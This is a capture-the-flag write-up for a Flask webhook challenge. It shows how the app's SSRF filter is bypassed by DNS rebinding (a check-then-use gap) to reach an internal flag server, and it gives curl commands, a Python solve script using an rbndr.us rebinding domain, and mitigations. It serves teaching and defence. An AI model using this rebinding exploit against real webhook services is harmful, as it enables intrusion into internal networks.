# Webhook - Web CTF Challenge Writeup (DELETED PROBLEM)

**Flag:** `0xfun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`

## Challenge Overview

A Flask web application that provides a webhook registration and triggering service. The goal is to access an internal flag server running on `127.0.0.1:5001`.

## Source Code Analysis

### Internal Flag Server
```python
class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())

threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()
```

The flag is served via POST request to `http://127.0.0.1:5001/flag` - only accessible from localhost.

### Webhook Endpoints

1. **`/register`** - Register a webhook URL
2. **`/trigger`** - Trigger a registered webhook and return the response

### SSRF Protection
```python
def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```

The application blocks:
- Private IPs (10.x.x.x, 172.16.x.x, 192.168.x.x)
- Loopback IPs (127.x.x.x)
- Link-local IPs
- Reserved IPs

## Vulnerability: DNS Rebinding (TOCTOU)

The vulnerability lies in a **Time-of-Check to Time-of-Use (TOCTOU)** race condition:

1. **Check Phase:** `is_ip_allowed()` resolves the hostname and validates the IP
2. **Use Phase:** `requests.post(url)` makes a separate DNS resolution

```python
@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    # ...
    allowed, reason = is_ip_allowed(url)  # DNS Resolution #1
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)  # DNS Resolution #2
```

Between these two DNS resolutions, we can make a domain return different IP addresses - this is **DNS Rebinding**.

## Exploitation

### DNS Rebinding Service

Using `rbndr.us` - a DNS rebinding service that alternates between two IP addresses:

Format: `<IP1_hex>.<IP2_hex>.rbndr.us`

- `1.1.1.1` in hex = `01010101` (public IP to pass the check)
- `127.0.0.1` in hex = `7f000001` (localhost to access the flag)

### Attack Steps

1. **Register webhook with DNS rebinding domain:**
```bash
curl -X POST http://chall.0xfun.org:38818/register \
  -d "url=http://01010101.7f000001.rbndr.us:5001/flag"
```

2. **Trigger the webhook repeatedly:**
```bash
curl -X POST http://chall.0xfun.org:38818/trigger \
  -d "id=<webhook_id>"
```

### Race Condition

Due to DNS caching and the random nature of `rbndr.us` responses:
- Sometimes both resolutions return `1.1.1.1` → connection fails (wrong server)
- Sometimes first returns `127.0.0.1` → blocked by filter
- Sometimes first returns `1.1.1.1`, second returns `127.0.0.1` → **SUCCESS!**

After multiple attempts, the timing aligns and we get the flag in the response.

## Solve Script

```python
import requests
import time

TARGET = "http://chall.0xfun.org:38818"
REBIND_DOMAIN = "http://01010101.7f000001.rbndr.us:5001/flag"

# Register webhook
for _ in range(20):
    r = requests.post(f"{TARGET}/register", data={"url": REBIND_DOMAIN})
    if "registered" in r.text:
        webhook_id = r.json()["id"]
        print(f"[+] Registered: {webhook_id}")
        
        # Trigger repeatedly
        for i in range(100):
            r = requests.post(f"{TARGET}/trigger", data={"id": webhook_id})
            if "response" in r.text and "error" not in r.text:
                print(f"[!] FLAG: {r.json().get('response')}")
                exit()
            time.sleep(0.1)
```

## Mitigation

1. **Resolve DNS once and use the IP directly** - Don't let the HTTP library resolve again
2. **Pin DNS resolution** - Cache the resolved IP for the entire request lifecycle
3. **Use allowlists** - Only allow specific trusted webhook domains
4. **Disable redirects** - Already done with `allow_redirects=False`

## References

- [DNS Rebinding Attack](https://en.wikipedia.org/wiki/DNS_rebinding)
- [rbndr.us - DNS Rebinding Service](https://lock.cmpxchg8b.com/rebinder.html)
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
